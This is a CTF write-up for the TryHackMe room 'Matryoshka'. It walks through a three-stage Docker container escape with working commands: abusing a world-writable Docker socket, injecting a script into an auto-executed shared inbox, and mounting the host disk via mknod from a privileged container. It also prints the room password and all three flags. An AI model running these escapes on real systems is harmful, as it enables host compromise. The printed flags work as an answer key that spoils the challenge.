# Matryoshka — TryHackMe CTF Writeup

**Room:** Matryoshka  
**Category:** Docker Escape / Container Security  
**Difficulty:** Hard  
**Author:** Rasan Fernando  
**Date:** 27 August 2026

---

## Overview

Matryoshka is a multi-stage Docker escape challenge inspired by the Russian nesting doll concept. The challenge consists of three nested container escape stages, each requiring a different exploitation technique. The goal is to escape from a restricted Level 1 container, pivot through Level 2 (Docker-in-Docker), and ultimately gain access to the real host filesystem to retrieve three flags.

**Connection:**
```
ssh matryoshka@<IP>
Password: n03sk@p3
```

---

## Flags

| Stage   | Flag                    |
|---------|-------------------------|
| Level 2 | `THM{RUN@W@Y_S0CK3T}`  |
| Level 3 | `THM{RW_B1ND3D}`        |
| Host    | `THM{SP@C3D_0UT}`       |

---

## Stage 1: Reconnaissance — Level 1 Container

Upon SSH login, we are greeted with a banner:

```
[*] You are in the Matryoshka Containment Unit. Escape is futile.
```

Initial enumeration confirms we are inside a Docker container:

```sh
$ ls /.dockerenv
/.dockerenv

$ id
uid=1000(matryoshka) gid=1000(matryoshka) groups=1000(matryoshka)

$ hostname
453c89ee5de5
```

Key finding — the Docker socket is exposed and world-writable:

```sh
$ ls -la /var/run/docker.sock
srw-rw-rw- 1 root 2375 0 Aug 27 15:34 /var/run/docker.sock
```

The `docker` binary is available in the container, which allows us to interact with the socket directly without curl or Python.

```sh
$ docker images
REPOSITORY          TAG       IMAGE ID       CREATED        SIZE
matryoshka-level1   local     485e908211ec   3 months ago   43.9MB
alpine              3.20      bf8527eb54c3   4 months ago   7.8MB
```

---

## Stage 2: Level 1 to Level 2 — Docker Socket Abuse

With access to the Docker socket and the `alpine:3.20` image available locally, we can mount the Level 2 container's entire filesystem at `/host` inside a new container. This grants us read/write access to Level 2's root filesystem without being inside it.

```sh
docker run --rm -v /:/host alpine:3.20 sh -c 'ls /host/root/'
```

Output:
```
flag_level2.txt
```

Reading the Level 2 flag:

```sh
docker run --rm -v /:/host alpine:3.20 sh -c 'cat /host/root/flag_level2.txt'
```

**Level 2 Flag: `THM{RUN@W@Y_S0CK3T}`**

Additional enumeration reveals a shared bind-mounted directory used for inter-container communication:

```sh
$ ls /host/mnt/level3share/
inbox/   outbox/
```

Both directories are world-writable (`drwxrwxrwx`). Inspecting the Level 2 entrypoint script at `/host/usr/local/bin/level2-entrypoint.sh` reveals the architecture:

- Level 2 runs a Docker-in-Docker (DinD) daemon with VFS storage driver.
- Level 2 spawns Level 1 as an inner container, passing the Docker socket.
- `/mnt/level3share` is a bind mount shared with a Level 3 container runner.

---

## Stage 3: Level 2 to Level 3 — Writable Bind-Mount Code Execution

The Level 3 runner monitors the `inbox` directory and executes any `.sh` scripts placed there, writing stdout/stderr to the `outbox` directory with a `.out` extension.

We write a reconnaissance script to the inbox:

```sh
docker run --rm -v /:/host alpine:3.20 sh -c \
  'cat > /host/mnt/level3share/inbox/exploit.sh << SCRIPT
cat /root/flag* 2>/dev/null
cat /proc/partitions
ls -la /dev/sd* /dev/vd* /dev/xvd* /dev/nvme* 2>/dev/null
id
hostname
SCRIPT
chmod +x /host/mnt/level3share/inbox/exploit.sh'
```

After a few seconds, we read the output:

```sh
docker run --rm -v /:/host alpine:3.20 \
  cat /host/mnt/level3share/outbox/exploit.sh.out
```

Output (truncated):
```
THM{RW_B1ND3D}
/root/flag_level3.txt
major minor  #blocks  name
 259        0    1048576 nvme1n1
 259        1   20971520 nvme0n1
 259        2   20970479 nvme0n1p1
brw-rw---- 1 root disk 259, 1 Aug 27 15:33 /dev/nvme0n1
brw-rw---- 1 root disk 259, 2 Aug 27 15:33 /dev/nvme0n1p1
uid=0(root) gid=0(root) groups=0(root),...
634b386d2eaa
```

**Level 3 Flag: `THM{RW_B1ND3D}`**

Key observations:
- Level 3 runs as `root` inside a privileged container.
- The real host block device is `/dev/nvme0n1p1` (major: 259, minor: 2).

---

## Stage 4: Level 3 to Host — Block Device Mount via mknod

Since Level 3 is a privileged container, we have the `CAP_SYS_ADMIN` capability and can use `mknod` to create a block device node pointing to the real host partition. We then mount it to read the host filesystem directly, bypassing any container boundaries.

We write the final exploit to the inbox:

```sh
docker run --rm -v /:/host alpine:3.20 sh -c \
  'cat > /host/mnt/level3share/inbox/hostflag.sh << SCRIPT
mkdir -p /tmp/hostmnt
mknod /tmp/hostdev b 259 2
mount /tmp/hostdev /tmp/hostmnt
find /tmp/hostmnt -name "flag*" -maxdepth 6 2>/dev/null | grep -v proc
cat /tmp/hostmnt/root/flag* 2>/dev/null
umount /tmp/hostmnt
SCRIPT
chmod +x /host/mnt/level3share/inbox/hostflag.sh'
```

Reading the outbox:

```sh
docker run --rm -v /:/host alpine:3.20 \
  cat /host/mnt/level3share/outbox/hostflag.sh.out
```

Output:
```
MOUNTED
/tmp/hostmnt/root/flag_host.txt
THM{SP@C3D_0UT}
```

**Host Flag: `THM{SP@C3D_0UT}`**

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| World-writable Docker socket | `/var/run/docker.sock` | Full container escape to Level 2 FS |
| Exposed Docker socket in Level 1 container | `/var/run/docker.sock` bind-mounted | Allows spawning arbitrary containers |
| Writable shared bind-mount with code execution runner | `/mnt/level3share/inbox` | Arbitrary command execution in Level 3 |
| Privileged container with host block device access | Level 3 container | Full host filesystem access via `mknod` + mount |

---

## Attack Chain Diagram

```
[SSH] matryoshka@<IP>
    |
    v
[Level 1 Container] (restricted shell)
    | docker socket exposed + world-writable
    | docker binary available
    v
[Alpine container] docker run -v /:/host alpine
    | mounts Level 2 root filesystem
    | reads /host/root/flag_level2.txt
    v
FLAG 2: THM{RUN@W@Y_S0CK3T}
    |
    | writes script to /host/mnt/level3share/inbox/
    v
[Level 3 Runner] (processes inbox scripts as root in privileged container)
    | executes our script
    | writes output to outbox
    v
FLAG 3: THM{RW_B1ND3D}
    |
    | mknod /dev/nvme0n1p1 (major 259, minor 2)
    | mount block device -> /tmp/hostmnt
    v
[Real Host Filesystem]
    | reads /tmp/hostmnt/root/flag_host.txt
    v
HOST FLAG: THM{SP@C3D_0UT}
```

---

## Tools Used

- Standard Unix utilities (`find`, `cat`, `ls`, `mknod`, `mount`)
- `docker` CLI (available in Level 1 container)
- Alpine Linux container image

---

## Key Takeaways

1. **Never expose the Docker socket to untrusted containers.** A world-readable Docker socket grants container escape equivalent to root on the host.

2. **Shared writable bind-mounts between containers are dangerous.** If a runner automatically executes scripts from a shared directory, any container with write access can inject arbitrary code.

3. **Privileged containers should never be used in production.** The `--privileged` flag grants access to all host devices, enabling an attacker to mount the real host filesystem using `mknod`.

4. **Defense in depth applies to container environments.** Each layer of isolation failed independently, but proper configuration of any single layer would have broken the chain.
